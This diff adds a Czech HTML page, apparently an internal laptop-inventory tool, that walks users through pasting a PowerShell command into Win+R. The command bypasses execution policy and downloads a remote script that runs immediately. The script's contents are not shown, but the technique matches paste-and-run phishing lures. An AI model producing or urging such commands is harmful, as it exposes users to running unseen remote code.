@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Inventura notebooku – Windows | Media:list</title>
+  <link rel="icon" href="https://cdn.medialist.cz/favicon.ico">
+  <link rel="dns-prefetch" href="https://cdn.medialist.cz">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+      background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 800px;
+      margin: 0 auto;
+    }
+
+    .breadcrumb {
+      margin-bottom: 24px;
+    }
+
+    .breadcrumb a {
+      color: #0B64D8;
+      text-decoration: none;
+      font-size: 0.95rem;
+      font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      transition: color 0.2s ease;
+    }
+
+    .breadcrumb a:hover {
+      color: #094ba8;
+    }
+
+    header {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    .logo {
+      width: 90px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+
+    h1 {
+      font-size: 2rem;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 12px;
+    }
+
+    .subtitle {
+      font-size: 1rem;
+      color: #6b7280;
+      line-height: 1.6;
+    }
+
+    .card {
+      background: white;
+      border-radius: 16px;
+      padding: 32px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
+      margin-top: 24px;
+    }
+
+    .section-title {
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: #111827;
+      margin-bottom: 16px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    ol {
+      margin: 16px 0;
+      padding-left: 24px;
+      line-height: 1.8;
+      color: #374151;
+    }
+
+    ol li {
+      margin: 12px 0;
+    }
+
+    ol li strong {
+      color: #111827;
+    }
+
+    .code-block {
+      margin: 20px 0;
+    }
+
+    .code-label {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: #6b7280;
+      margin-bottom: 8px;
+    }
+
+    code {
+      display: block;
+      background: #1e293b;
+      color: #e5e7eb;
+      padding: 16px 20px;
+      border-radius: 8px;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 0.9rem;
+      white-space: pre-wrap;
+      word-break: break-all;
+      line-height: 1.6;
+      border: 2px solid #334155;
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 16px;
+      padding: 12px 24px;
+      border-radius: 8px;
+      border: none;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      background: #0B64D8;
+      color: white;
+      transition: background 0.2s ease, transform 0.1s ease;
+    }
+
+    .btn:hover {
+      background: #094ba8;
+      transform: translateY(-1px);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    .note {
+      font-size: 0.9rem;
+      color: #6b7280;
+      margin-top: 12px;
+      padding: 12px 16px;
+      background: #f8fafc;
+      border-radius: 6px;
+      border-left: 3px solid #0B64D8;
+      line-height: 1.6;
+    }
+
+    .info-box {
+      background: #eff6ff;
+      border: 2px solid #bfdbfe;
+      border-radius: 12px;
+      padding: 20px;
+      margin-top: 24px;
+    }
+
+    .info-box-title {
+      font-weight: 700;
+      color: #1e40af;
+      margin-bottom: 8px;
+      font-size: 1rem;
+    }
+
+    .info-box p {
+      color: #1e40af;
+      line-height: 1.6;
+      font-size: 0.95rem;
+    }
+
+    footer {
+      text-align: center;
+      margin-top: 48px;
+      color: #6b7280;
+      font-size: 0.9rem;
+    }
+
+    @media (max-width: 640px) {
+      .container {
+        padding: 0;
+      }
+
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      .card {
+        padding: 24px 20px;
+      }
+
+      code {
+        font-size: 0.8rem;
+        padding: 12px 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="breadcrumb">
+      <a href="index.html">← Zpět na výběr systému</a>
+    </div>
+
+    <header>
+      <img src="https://cdn.medialist.cz/ml_logo.png" alt="Media:list" class="logo">
+      <h1>💻 Inventura notebooku – Windows</h1>
+      <p class="subtitle">Prosím o rychlé vyplnění inventury notebooku, zabere to zhruba 30 sekund.</p>
+    </header>
+
+    <div class="card">
+      <h2 class="section-title">📋 Postup na Windows</h2>
+      <ol>
+        <li>Klikni na tlačítko <strong>„Zkopírovat příkaz"</strong> níže.</li>
+        <li>Stiskni na klávesnici <strong>Win + R</strong>.</li>
+        <li>Do okna „Spustit" vlož příkaz (<strong>Ctrl + V</strong>) a potvrď <strong>Enter</strong>.</li>
+        <li>V otevřeném okně doplň své <strong>jméno</strong>, zvol <em>firemní / osobní</em> a případnou poznámku, pak klikni na <strong>Odeslat</strong>.</li>
+      </ol>
+
+      <div class="code-block">
+        <div class="code-label">Příkaz PowerShell:</div>
+        <code id="cmd">powershell -ExecutionPolicy Bypass -Command "irm 'https://cdn.medialist.cz/inventura-notebook3.ps1' | iex"</code>
+      </div>
+
+      <button id="copyBtn" class="btn">📋 Zkopírovat příkaz</button>
+      <p class="note" id="statusText">💡 Pokud by kopírování tlačítkem nefungovalo, příkaz výše stačí ručně označit a zkopírovat (Ctrl + C).</p>
+    </div>
+
+    <div class="info-box">
+      <div class="info-box-title">ℹ️ Co se stane po spuštění?</div>
+      <p>Skript automaticky zjistí informace o tvém notebooku (model, sériové číslo, procesor, paměť) a odešle je do našeho systému. Neukládáme žádná citlivá osobní data ani hesla.</p>
+    </div>
+
+    <footer>
+      <p>Media:list Internal Tools &copy; 2025</p>
+    </footer>
+  </div>
+
+  <script>
+    const cmdElement = document.getElementById('cmd');
+    const btn = document.getElementById('copyBtn');
+    const status = document.getElementById('statusText');
+
+    const cmdText = cmdElement.innerText.trim();
+
+    btn.addEventListener('click', async () => {
+      if (!navigator.clipboard) {
+        status.textContent = "Prohlížeč nepodporuje automatické kopírování. Označ příkaz ručně a zkopíruj (Ctrl + C).";
+        return;
+      }
+
+      try {
+        await navigator.clipboard.writeText(cmdText);
+        btn.textContent = "Zkopírováno ✅";
+        status.textContent = "Příkaz je ve schránce. Stiskni Win + R, vlož (Ctrl + V) a potvrď Enter.";
+        btn.disabled = true;
+        setTimeout(() => {
+          btn.textContent = "Zkopírovat příkaz";
+          btn.disabled = false;
+          status.textContent = "Pokud by kopírování tlačítkem nefungovalo, příkaz výše stačí ručně označit a zkopírovat (Ctrl + C).";
+        }, 4000);
+      } catch (e) {
+        status.textContent = "Kopírování selhalo, příkaz označ a zkopíruj ručně (Ctrl + C).";
+      }
+    });
+  </script>
+</body>
+</html>
